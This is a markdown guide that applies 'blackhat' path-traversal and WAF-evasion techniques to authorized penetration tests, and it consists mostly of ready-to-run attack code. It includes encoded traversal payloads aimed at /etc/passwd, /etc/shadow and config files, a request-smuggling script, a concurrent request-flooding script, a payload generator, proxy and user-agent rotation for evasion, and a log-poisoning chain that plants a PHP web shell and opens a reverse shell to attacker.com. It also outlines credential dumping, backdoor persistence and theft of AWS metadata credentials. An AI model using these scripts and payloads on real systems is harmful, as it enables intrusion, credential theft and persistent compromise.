# Aggressive Testing Guide - Blackhat Techniques for Whitehat Work

## Philosophy

**Think like an attacker, act like a professional.**

This guide demonstrates how to use real-world blackhat attack techniques in authorized whitehat security assessments. The goal is to truly test defenses by simulating actual adversary behavior.

---

## Table of Contents

1. [Pre-Engagement](#pre-engagement)
2. [Reconnaissance Phase](#reconnaissance-phase)
3. [Exploitation Techniques](#exploitation-techniques)
4. [Automation Strategies](#automation-strategies)
5. [Evasion Techniques](#evasion-techniques)
6. [Post-Exploitation](#post-exploitation)
7. [Real-World Attack Chains](#real-world-attack-chains)
8. [Tools & Scripts](#tools--scripts)

---

## Pre-Engagement

### Authorization Checklist

Before using aggressive techniques:

- [ ] **Written authorization** signed by client
- [ ] **Scope defined** (IPs, domains, applications)
- [ ] **Rules of engagement** agreed upon
- [ ] **Emergency contacts** established
- [ ] **Testing windows** confirmed
- [ ] **Backup plan** if critical system affected
- [ ] **Insurance** coverage verified

### Scope Definition Template

```
CLIENT: [Company Name]
TESTER: [Your Name/Company]
DATE: [Start-End]

IN-SCOPE TARGETS:
- https://test.example.com/*
- https://staging.example.com/*
- 192.168.1.0/24

OUT-OF-SCOPE:
- Production database servers
- Payment processing systems
- Third-party integrations

ALLOWED TECHNIQUES:
- [x] Directory traversal
- [x] Authentication bypass
- [x] WAF evasion
- [ ] DoS attacks (NOT ALLOWED)
- [ ] Social engineering (NOT ALLOWED)

MAX REQUEST RATE: 100 req/sec
TESTING HOURS: Mon-Fri 9AM-5PM EST
```

---

## Reconnaissance Phase

### Step 1: Technology Fingerprinting

```bash
# Identify web server
curl -I https://target.com

# Check for WAF
wafw00f https://target.com

# Alternative WAF detection
nmap -p443 --script http-waf-detect https://target.com

# Technology stack detection
whatweb https://target.com
wappalyzer https://target.com
```

### Step 2: Endpoint Discovery

```bash
# Directory brute-force
ffuf -w /usr/share/wordlists/dirb/common.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,403

# API endpoint discovery
gospider -s https://target.com -c 10 -d 3

# JavaScript file analysis (find API endpoints)
python3 LinkFinder.py -i https://target.com -o results.html

# Content discovery
feroxbuster -u https://target.com -w /path/to/wordlist -x php,html,js
```

### Step 3: Parameter Discovery

```bash
# Identify URL parameters
paramspider -d target.com

# Discover hidden parameters
arjun -u https://target.com/page.php

# Historical parameters (from Wayback Machine)
waybackurls target.com | grep "?" | sort -u
```

---

## Exploitation Techniques

### Technique 1: Progressive Complexity Testing

Start simple, increase complexity based on response:

```bash
# Level 1: Basic
curl "https://target.com/page?file=../../etc/passwd"

# Level 2: Single encoding
curl "https://target.com/page?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Level 3: Double encoding
curl "https://target.com/page?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Level 4: Unicode
curl "https://target.com/page?file=%c0%ae%c0%ae%c0%afetc%c0%afpasswd"

# Level 5: Server-specific
curl "https://target.com/page?file=..;/..;/etc/passwd"

# Level 6: Hybrid/Complex
curl "https://target.com/page?file=%2e%2e;/%c0%ae%c0%ae%2f....//etc%00/passwd"
```

### Technique 2: Request Smuggling for Bypass

```python
#!/usr/bin/env python3
# HTTP Request Smuggling with Path Traversal

import socket

# Craft smuggled request
request = b"""POST / HTTP/1.1\r
Host: target.com\r
Content-Length: 100\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /api?file=../../etc/passwd HTTP/1.1\r
Host: target.com\r
X: """

request += b"X" * 50 + b"\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("target.com", 443))
# Note: Add SSL wrapping for HTTPS
s.send(request)
response = s.recv(4096)
print(response.decode())
s.close()
```

### Technique 3: Race Condition Exploitation

```python
#!/usr/bin/env python3
# Race condition attack - overwhelm WAF

import requests
import threading

target = "https://target.com/api?file="
payloads = [
    "../../etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
    "..;/..;/etc/passwd",
    "....//....//etc/passwd",
]

def attack(payload):
    try:
        r = requests.get(target + payload, timeout=2)
        if "root:" in r.text:
            print(f"[+] SUCCESS: {payload}")
            print(r.text[:200])
    except:
        pass

# Launch 500 simultaneous requests
threads = []
for i in range(100):
    for payload in payloads:
        t = threading.Thread(target=attack, args=(payload,))
        threads.append(t)
        t.start()

for t in threads:
    t.join()
```

### Technique 4: Parameter Pollution

```bash
# HPP attack - different parsers handle differently
curl "https://target.com/api?file=safe.txt&file=../../etc/passwd"

# Split parameters
curl "https://target.com/api?dir=../&path=../&file=etc/passwd"

# Case variation in parameter names
curl "https://target.com/api?File=../../etc/passwd"
curl "https://target.com/api?FILE=../../etc/passwd"
curl "https://target.com/api?fIlE=../../etc/passwd"
```

### Technique 5: Header Injection

```bash
# X-Original-URL header bypass
curl https://target.com/safe \
  -H "X-Original-URL: ../../etc/passwd"

# X-Rewrite-URL
curl https://target.com/safe \
  -H "X-Rewrite-URL: ../../../etc/passwd"

# Custom headers
curl https://target.com/api \
  -H "X-File-Path: ../../etc/passwd" \
  -H "X-Custom-Include: ../../../etc/passwd"

# Referer-based bypass
curl https://target.com/api?file=../../etc/passwd \
  -H "Referer: https://target.com/admin/"
```

---

## Automation Strategies

### Strategy 1: ffuf (Fast Fuzzing)

```bash
# Basic fuzzing
ffuf -w payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 \
     -fw 0

# Multi-position fuzzing
ffuf -w payloads.txt:PAYLOAD \
     -w depths.txt:DEPTH \
     -u https://target.com/DEPTH/api?file=PAYLOAD \
     -mc 200

# Filter by response size
ffuf -w payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 \
     -fs 1234

# Match regex in response
ffuf -w payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 \
     -mr "root:.*:0:0"

# Save successful payloads
ffuf -w payloads.txt \
     -u https://target.com/api?file=FUZZ \
     -mc 200 \
     -mr "root:" \
     -o results.json
```

### Strategy 2: Burp Suite Intruder

**Setup:**

1. Intercept request in Burp
2. Send to Intruder (Ctrl+I)
3. Set injection points
4. Load payloads from repository files
5. Configure grep matching

**Payloads configuration:**

```
Payload Set 1: Load from Advanced_WAF_Bypass_Payloads.txt
Payload Set 2: Load from Aggressive_Testing_Payloads.txt

Payload Processing:
- URL-encode all characters (if needed)
- Add prefix: ../
- Add suffix: %00

Grep - Match:
- root:.*:0:0
- admin
- password
- ERROR
- Exception
```

**Attack types:**

- **Sniper**: Single parameter, all payloads
- **Battering ram**: Multiple parameters, same payload
- **Pitchfork**: Multiple parameters, iterate together
- **Cluster bomb**: Multiple parameters, all combinations

### Strategy 3: Custom Python Script

```python
#!/usr/bin/env python3
"""
Advanced Path Traversal Fuzzer
Implements intelligent payload selection based on responses
"""

import requests
import time
import random
from urllib.parse import quote

class AdvancedFuzzer:
    def __init__(self, base_url, param_name):
        self.base_url = base_url
        self.param = param_name
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

    def load_payloads(self, filename):
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]

    def test_payload(self, payload, encoding='none'):
        """Test a payload with optional encoding"""

        if encoding == 'url':
            payload = quote(payload)
        elif encoding == 'double':
            payload = quote(quote(payload))

        url = f"{self.base_url}?{self.param}={payload}"

        try:
            r = self.session.get(url, timeout=5)
            return {
                'payload': payload,
                'status': r.status_code,
                'length': len(r.text),
                'response': r.text,
                'headers': dict(r.headers)
            }
        except Exception as e:
            return {'payload': payload, 'error': str(e)}

    def analyze_response(self, result):
        """Determine if response indicates success"""

        if 'error' in result:
            return False

        # Check for common success indicators
        success_indicators = [
            'root:',
            'admin',
            '<?php',
            'connection',
            '[mail]',
            'extensions',
        ]

        text_lower = result['response'].lower()
        for indicator in success_indicators:
            if indicator in text_lower:
                return True

        # Check for unusual response length
        if result['length'] > 500:
            return True

        return False

    def intelligent_fuzz(self, payloads):
        """
        Intelligent fuzzing that adapts based on responses
        """

        results = []
        encodings = ['none', 'url', 'double']

        print(f"[*] Testing {len(payloads)} payloads...")

        for i, payload in enumerate(payloads):
            # Random delay to avoid rate limiting
            time.sleep(random.uniform(0.1, 0.5))

            # Try different encodings
            for encoding in encodings:
                result = self.test_payload(payload, encoding)

                if self.analyze_response(result):
                    print(f"[+] POTENTIAL HIT: {payload} (encoding: {encoding})")
                    print(f"    Status: {result['status']}, Length: {result['length']}")
                    print(f"    Preview: {result['response'][:200]}")
                    results.append(result)
                    break  # Found something, move to next payload

            if (i + 1) % 50 == 0:
                print(f"[*] Progress: {i+1}/{len(payloads)}")

        return results

    def export_results(self, results, filename='results.txt'):
        """Export successful results"""

        with open(filename, 'w') as f:
            for r in results:
                f.write(f"Payload: {r['payload']}\n")
                f.write(f"Status: {r['status']}\n")
                f.write(f"Length: {r['length']}\n")
                f.write(f"Response:\n{r['response']}\n")
                f.write("-" * 80 + "\n")

# Usage
if __name__ == "__main__":
    fuzzer = AdvancedFuzzer(
        base_url="https://target.com/api",
        param_name="file"
    )

    payloads = fuzzer.load_payloads("Advanced_WAF_Bypass_Payloads.txt")
    results = fuzzer.intelligent_fuzz(payloads)
    fuzzer.export_results(results)

    print(f"\n[+] Found {len(results)} potential vulnerabilities")
```

### Strategy 4: Payload Generation Script

```python
#!/usr/bin/env python3
"""
Dynamic Payload Generator
Creates permutations of encoding techniques
"""

import itertools
from urllib.parse import quote

def generate_encodings(base_string):
    """Generate multiple encoding variations"""

    encodings = []

    # Original
    encodings.append(base_string)

    # URL encoded
    encodings.append(quote(base_string))

    # Double URL encoded
    encodings.append(quote(quote(base_string)))

    # Custom encodings
    custom = base_string.replace('.', '%2e').replace('/', '%2f')
    encodings.append(custom)

    # Mixed case
    encodings.append(base_string.replace('/', '%2F'))
    encodings.append(base_string.replace('.', '%2E'))

    # Unicode
    encodings.append(base_string.replace('.', '%u002e').replace('/', '%u2215'))

    # Overlong UTF-8
    encodings.append(base_string.replace('.', '%c0%ae').replace('/', '%c0%af'))

    return encodings

def generate_depths(max_depth=15):
    """Generate traversal patterns with varying depths"""

    patterns = []

    for depth in range(1, max_depth + 1):
        patterns.append('../' * depth)
        patterns.append('..\\' * depth)
        patterns.append('%2e%2e%2f' * depth)
        patterns.append('..;/' * depth)
        patterns.append('....//..../' * depth)

    return patterns

def generate_targets():
    """Common target files"""

    targets = [
        'etc/passwd',
        'etc/shadow',
        'windows/win.ini',
        'windows/system32/config/sam',
        'proc/self/environ',
        'var/log/apache2/access.log',
        '.env',
        'config.php',
        'wp-config.php',
    ]

    return targets

def generate_full_payloads():
    """Generate complete payload set"""

    depths = generate_depths(10)
    targets = generate_targets()

    payloads = []

    for depth, target in itertools.product(depths, targets):
        base_payload = depth + target

        # Generate encoding variations
        for encoded in generate_encodings(base_payload):
            payloads.append(encoded)

            # Add null byte variants
            payloads.append(encoded + '%00')
            payloads.append(encoded + '%00.jpg')
            payloads.append(encoded + '%00.png')

    return list(set(payloads))  # Remove duplicates

# Generate and save
if __name__ == "__main__":
    payloads = generate_full_payloads()

    with open('generated_payloads.txt', 'w') as f:
        for payload in payloads:
            f.write(payload + '\n')

    print(f"[+] Generated {len(payloads)} payloads")
    print(f"[+] Saved to generated_payloads.txt")
```

---

## Evasion Techniques

### Evasion 1: Timing-Based Bypass

```python
#!/usr/bin/env python3
# Some WAFs timeout on slow requests

import requests
import time

def slow_request(url, payload):
    """Send request with intentional delays"""

    s = requests.Session()

    # Add delays between characters
    slow_payload = ""
    for char in payload:
        slow_payload += char
        time.sleep(0.1)  # 100ms per character

    return s.get(url + slow_payload)

# Usage
response = slow_request("https://target.com/api?file=", "../../etc/passwd")
```

### Evasion 2: IP Rotation

```python
#!/usr/bin/env python3
# Rotate through proxies to avoid IP blocking

import requests
import random

proxies_list = [
    {'http': 'http://proxy1.com:8080'},
    {'http': 'http://proxy2.com:8080'},
    {'http': 'http://proxy3.com:8080'},
]

def rotate_request(url):
    proxy = random.choice(proxies_list)
    return requests.get(url, proxies=proxy)
```

### Evasion 3: User-Agent Rotation

```python
#!/usr/bin/env python3

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
]

def random_ua_request(url):
    headers = {'User-Agent': random.choice(user_agents)}
    return requests.get(url, headers=headers)
```

### Evasion 4: Session Persistence

```bash
# Some WAFs allow initial requests then block
# Solution: Establish "good" session first

# Step 1: Normal browsing
curl -c cookies.txt https://target.com/
curl -b cookies.txt https://target.com/about
curl -b cookies.txt https://target.com/contact

# Step 2: Attack using established session
curl -b cookies.txt "https://target.com/api?file=../../etc/passwd"
```

---

## Post-Exploitation

### Chain 1: LFI to RCE via Log Poisoning

```bash
# Step 1: Inject PHP code into logs
curl "https://target.com/" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Step 2: Include poisoned log file
curl "https://target.com/api?file=../../var/log/apache2/access.log&cmd=id"

# Step 3: Full shell
curl "https://target.com/api?file=../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
```

### Chain 2: LFI to Session Hijacking

```bash
# Step 1: Read session files
curl "https://target.com/api?file=../../tmp/sess_[SESSION_ID]"

# Step 2: Extract admin session token
# Step 3: Hijack session using token
```

### Chain 3: LFI to Source Code Analysis

```bash
# Read application source
curl "https://target.com/api?file=../../var/www/html/config.php"

# Find database credentials
# Find API keys
# Find other vulnerabilities in code
```

---

## Real-World Attack Chains

### Attack Chain 1: Complete Compromise

```
1. Reconnaissance
   └─> Discover file parameter: /api/download?file=report.pdf

2. Initial Test
   └─> Test basic traversal: ?file=../../etc/passwd
   └─> BLOCKED by WAF

3. Encoding Bypass
   └─> Try double encoding: ?file=%252e%252e%252fetc%252fpasswd
   └─> SUCCESS - WAF bypassed

4. Escalation
   └─> Read application config: ?file=%252e%252e%252fconfig.php
   └─> Extract database credentials

5. Database Access
   └─> Connect to database using credentials
   └─> Dump user tables

6. Privilege Escalation
   └─> Read /etc/shadow
   └─> Crack password hashes
   └─> SSH access with cracked credentials

7. Persistence
   └─> Add SSH key to authorized_keys
   └─> Install backdoor
```

### Attack Chain 2: AWS Metadata Exploitation

```
1. Find SSRF vulnerability combined with path traversal

2. Access AWS metadata:
   ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

3. Extract IAM credentials

4. Use credentials to access S3 buckets

5. Find sensitive data in S3

6. Lateral movement to other AWS services
```

---

## Tools & Scripts

### Essential Tools

```bash
# Install required tools
apt install ffuf wfuzz curl jq python3-requests

# Clone useful repos
git clone https://github.com/swisskyrepo/PayloadsAllTheThings
git clone https://github.com/danielmiessler/SecLists

# Install custom tools
pip3 install arjun paramspider
go install github.com/ffuf/ffuf@latest
```

### Quick Reference Commands

```bash
# Fast directory traversal test
for i in {1..15}; do
  echo -n "Depth $i: "
  curl -s "https://target.com/api?file=$(printf '../%.0s' $(seq 1 $i))etc/passwd" | grep -q "root:" && echo "VULN" || echo "SAFE"
done

# Test all encodings quickly
while read payload; do
  curl -s "https://target.com/api?file=$payload" | grep -q "root:" && echo "[+] $payload"
done < payloads.txt

# Parallel testing
cat payloads.txt | parallel -j 20 'curl -s "https://target.com/api?file={}" | grep -q "root:" && echo "{}"'
```

---

## Final Notes

### Success Indicators

Look for these in responses:

- **Linux**: `root:x:0:0:root:/root:/bin/bash`
- **Windows**: `; for 16-bit app support`
- **Source code**: `<?php`, `import`, `require`
- **Config files**: `password=`, `secret=`, `api_key=`
- **Error messages**: Stack traces, path disclosure

### Reporting Template

```markdown
## Finding: Directory Traversal with WAF Bypass

**Severity**: Critical
**URL**: https://target.com/api?file=PAYLOAD
**Parameter**: file

**Payload Used**:
%252e%252e%252fetc%252fpasswd

**Impact**:
- Arbitrary file read
- Source code disclosure
- Credential exposure
- Potential RCE via log poisoning

**Steps to Reproduce**:
1. Navigate to /api endpoint
2. Send GET request with file parameter
3. Use double URL encoding to bypass WAF
4. Successfully read /etc/passwd

**Recommendation**:
1. Implement whitelist of allowed files
2. Use basename() to prevent directory traversal
3. Update WAF rules to detect encoded payloads
4. Apply principle of least privilege
```

---

## Remember

- **Authorization first**: Never test without permission
- **Document everything**: Keep detailed logs
- **Report responsibly**: Follow disclosure guidelines
- **Stay updated**: New bypasses discovered regularly
- **Think adversarially**: Assume defenses will adapt

---

**"The best defense is understanding the offense."**

